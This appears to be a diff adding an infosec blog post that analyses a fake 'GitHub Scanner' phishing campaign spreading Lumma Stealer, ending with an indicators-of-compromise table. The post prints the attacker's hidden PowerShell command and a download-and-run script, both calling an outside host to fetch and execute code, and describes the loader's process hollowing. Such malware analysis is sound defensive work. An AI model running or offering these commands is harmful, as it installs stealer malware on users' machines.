@@ -1,0 +1,199 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>[MALWARE] Lumma Stealer Loader Analysis // Tzion</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.122.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="Tzion" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://tzion0.github.io/css/main.min.e1fda2b3aeeaca02fa5b7c35a05438808bf1292a3bb0de84260054c1a9cf3aca.css" />
+
+    
+    <meta name="twitter:card" content="summary"/><meta name="twitter:title" content="[MALWARE] Lumma Stealer Loader Analysis"/>
+<meta name="twitter:description" content="Introduction On September 19, 2024, I received an email regarding a GitHub Scanner result for my public repository. Initially, the email was not flagged as malicious or spam; however, further investigation revealed it to be part of a malware campaign attempting to distribute Lumma Stealer, disguised as a GitHub Scanner notification.
+Technical Analysis Upon accessing the link (https://github-scanner.com), a Captcha verification page is presented.
+The Captcha Verification steps are as follow:"/>
+
+    <meta property="og:title" content="[MALWARE] Lumma Stealer Loader Analysis" />
+<meta property="og:description" content="Introduction On September 19, 2024, I received an email regarding a GitHub Scanner result for my public repository. Initially, the email was not flagged as malicious or spam; however, further investigation revealed it to be part of a malware campaign attempting to distribute Lumma Stealer, disguised as a GitHub Scanner notification.
+Technical Analysis Upon accessing the link (https://github-scanner.com), a Captcha verification page is presented.
+The Captcha Verification steps are as follow:" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://tzion0.github.io/posts/github-scanner-lumma-stealer/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-09-22T00:00:00+00:00" />
+<meta property="article:modified_time" content="2024-09-22T00:00:00+00:00" />
+
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://tzion0.github.io/"><img class="app-header-avatar" src="/avatar.jpg" alt="Tzion" /></a>
+      <h1>Tzion</h1>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/about/">About</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/posts/">Blog</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/tags/">Tags</a>
+      </nav>
+      <p>Yet Another Infosec Blog, Enjoy!</p>
+      <div class="app-header-social">
+        
+          <a href="https://twitter.com/Tzion0" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-twitter">
+  <title>My Twitter</title>
+  <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path>
+</svg>
+          </a>
+        
+          <a href="https://github.com/Tzion0" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>My Github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">[MALWARE] Lumma Stealer Loader Analysis</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Sep 22, 2024
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          3 min read
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
+  <title>tag</title>
+  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7.01" y2="7"></line>
+</svg>
+              <a class="tag" href="https://tzion0.github.io/tags/malware/">MALWARE</a>
+              <a class="tag" href="https://tzion0.github.io/tags/rev/">REV</a>
+              <a class="tag" href="https://tzion0.github.io/tags/lumma/">LUMMA</a>
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h1 id="introduction">Introduction</h1>
+<p>On September 19, 2024, I received an email regarding a GitHub Scanner result for my public repository. Initially, the email was not flagged as malicious or spam; however, further investigation revealed it to be part of a malware campaign attempting to distribute Lumma Stealer, disguised as a GitHub Scanner notification.</p>
+<p><img src="/img/github-scanner-lumma-stealer/img.png" alt="IMG"></p>
+<h1 id="technical-analysis">Technical Analysis</h1>
+<p>Upon accessing the link (<a href="https://github-scanner.com">https://github-scanner.com</a>), a Captcha verification page is presented.</p>
+<p><img src="/img/github-scanner-lumma-stealer/img2.jpg" alt="IMG2"></p>
+<p>The Captcha Verification steps are as follow:</p>
+<p><img src="/img/github-scanner-lumma-stealer/img3.jpg" alt="IMG3"></p>
+<p>The copied malicious PowerShell payload will execute the commands specified in <code>download.txt</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps" data-lang="ps"><span style="display:flex;"><span><span style="color:#a6e22e">powershell.exe</span> <span style="color:#a6e22e">-w</span> <span style="color:#a6e22e">hidden</span> <span style="color:#a6e22e">-Command</span> <span style="color:#a6e22e">&#34;iex</span> <span style="color:#e6db74">(iwr &#39;https://github-scanner.com/download.txt&#39;)</span><span style="color:#a6e22e">.Content&#34;</span> <span style="color:#a6e22e">#</span> <span style="color:#a6e22e">&#34;✅</span> <span style="color:#a6e22e">&#39;&#39;I</span> <span style="color:#a6e22e">am</span> <span style="color:#a6e22e">not</span> <span style="color:#a6e22e">a</span> <span style="color:#a6e22e">robot</span> <span style="color:#a6e22e">-</span> <span style="color:#a6e22e">reCAPTCHA</span> <span style="color:#a6e22e">Verification</span> <span style="color:#a6e22e">ID:</span> <span style="color:#a6e22e">93752&#34;</span>
+</span></span></code></pre></div><p>The <code>download.txt</code> contains the following content, which fetches an executable, renames it to <code>SysSetup.exe</code>, and executes it:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps" data-lang="ps"><span style="display:flex;"><span><span style="color:#a6e22e">$webClient</span> <span style="color:#a6e22e">=</span> <span style="color:#a6e22e">New-Object</span> <span style="color:#a6e22e">System.Net.WebClient</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">$url1</span> <span style="color:#a6e22e">=</span> <span style="color:#a6e22e">&#34;https:</span><span style="color:#960050;background-color:#1e0010">/</span>/github-scanner.com/l6E.exe&#34;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">$filePath1</span> <span style="color:#a6e22e">=</span> <span style="color:#a6e22e">&#34;$env:TEMP\SysSetup.exe&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">$webClient.DownloadFile</span><span style="color:#e6db74">($url1, $filePath1)</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Start-Process</span> <span style="color:#a6e22e">-FilePath</span>  <span style="color:#a6e22e">$env:TEMP\SysSetup.exe</span>
+</span></span></code></pre></div><p>The <code>l6E.exe</code> (also referred to as <code>SysSetup.exe</code>) is a .NET executable, and its main function is as follows:</p>
+<p><img src="/img/github-scanner-lumma-stealer/img4.png" alt="IMG4"></p>
+<p>The <code>PersonalActivation</code> method serves as a decryption function to decrypt <code>Program.AIOsncoiuuA</code>, using <code>Program.Alco</code> as the key, and <code>MoveAngles.userBuffer</code>, using <code>MoveAngles.key</code>:</p>
+<p><img src="/img/github-scanner-lumma-stealer/img5.png" alt="IMG5"></p>
+<p>Upon decrypting the blob, it calls <code>VirtualProtect</code> on it with <strong>PAGE_EXECUTE_READWRITE</strong> permissions, and then executes it using <code>CallWindowProcW</code>.</p>
+<p>The <code>Program.AIOsncoiuuA</code> appears to be shellcode and <code>MoveAngles.userBuffer</code> is an executable once decrypted:</p>
+<p><img src="/img/github-scanner-lumma-stealer/img6.png" alt="IMG6"></p>
+<h2 id="shellcode-analysis">Shellcode Analysis</h2>
+<p>The shellcode first iterates through <strong>_PEB_LDR_DATA</strong> to resolve the <code>LoadLibraryA</code> and <code>GetProcAddress</code> APIs:</p>
+<p><img src="/img/github-scanner-lumma-stealer/img7.png" alt="IMG7"></p>
+<p>It then uses the <code>GetProcAddress</code> to obtain the addresses of the following APIs: <code>CreateProcessA</code>, <code>VirtualAlloc</code>, <code>GetThreatContext</code>, <code>ReadProcessMemory</code>, <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>SetThreatContext</code> and <code>ResumeThread</code>.</p>
+<p><img src="/img/github-scanner-lumma-stealer/img8.png" alt="IMG8"></p>
+<p>Moving on, it spawns a child process of <code>RegAsm.exe</code> and allocates memory in its address space with <strong>PAGE_EXECUTE_READWRITE</strong> permissions. It then retrieves the current thread context of <code>RegAsm.exe</code>, allowing the it to later modify its execution flow by manipulating the thread&rsquo;s state and registers, this suggest that it setting up memory for Process Hollowing later.</p>
+<p><img src="/img/github-scanner-lumma-stealer/img9.png" alt="IMG9"></p>
+<p>After that, the <code>MoveAngles.userBuffer</code> EXE code sections are now written into the memory of <code>RegAsm.exe</code>. This step is key to the process hollowing technique, as the legitimate <code>RegAsm.exe</code> code is replaced with malicious code. Each section of memory (<code>.text</code>, .<code>rdata</code>, <code>.data</code>, <code>.reloc</code>) is replaced sequentially, suggesting a complete takeover of the executable&rsquo;s logic.</p>
+<p><img src="/img/github-scanner-lumma-stealer/img10.png" alt="IMG10"></p>
+<p>Finally, the loader restores the modified thread context (<code>SetThreadContext</code>) to point to the newly injected malicious code, and then resumes the thread using <code>ResumeThread</code>. At this point, <code>RegAsm.exe</code> will execute the malicious code instead of its original program.</p>
+<p><img src="/img/github-scanner-lumma-stealer/img11.png" alt="IMG11"></p>
+<p>The malicious EXE code injected into <code>RegAsm.exe</code> is as follow, at the first glance it seems decrypting itself at runtime:</p>
+<p><img src="/img/github-scanner-lumma-stealer/img12.png" alt="IMG12"></p>
+<p>Execute it <a href="https://any.run/">ANY RUN</a> tells us that LUMMA Stealer has been detected:</p>
+<p><img src="/img/github-scanner-lumma-stealer/img13.png" alt="IMG13"></p>
+<h1 id="indicator-of-compromise">Indicator of Compromise</h1>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">Indicator Type</th>
+<th style="text-align:right">IOCs</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">Domain</td>
+<td style="text-align:right">malware-scanner.com</td>
+</tr>
+<tr>
+<td style="text-align:left">Domain</td>
+<td style="text-align:right">2x.si</td>
+</tr>
+<tr>
+<td style="text-align:left">Domain</td>
+<td style="text-align:right">eemmbryequo.shop</td>
+</tr>
+<tr>
+<td style="text-align:left">Domain</td>
+<td style="text-align:right">keennylrwmqlw.shop</td>
+</tr>
+<tr>
+<td style="text-align:left">Domain</td>
+<td style="text-align:right">licenseodqwmqn.shop</td>
+</tr>
+<tr>
+<td style="text-align:left">Domain</td>
+<td style="text-align:right">tendencctywop.shop</td>
+</tr>
+<tr>
+<td style="text-align:left">Domain</td>
+<td style="text-align:right">tesecuuweqo.shop</td>
+</tr>
+<tr>
+<td style="text-align:left">Domain</td>
+<td style="text-align:right">relaxatinownio.shop</td>
+</tr>
+<tr>
+<td style="text-align:left">Domain</td>
+<td style="text-align:right">reggwardssdqw.shop</td>
+</tr>
+<tr>
+<td style="text-align:left">Domain</td>
+<td style="text-align:right">tryyudjasudqo.shop</td>
+</tr>
+<tr>
+<td style="text-align:left">SHA256</td>
+<td style="text-align:right">D737637EE5F121D11A6F3295BF0D51B06218812B5EC04FE9EA484921E905A207</td>
+</tr>
+</tbody>
+</table>
+<h1 id="references">References</h1>
+<p><a href="https://x.com/troyhunt/status/1836508464375308684">https://x.com/troyhunt/status/1836508464375308684</a></p>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
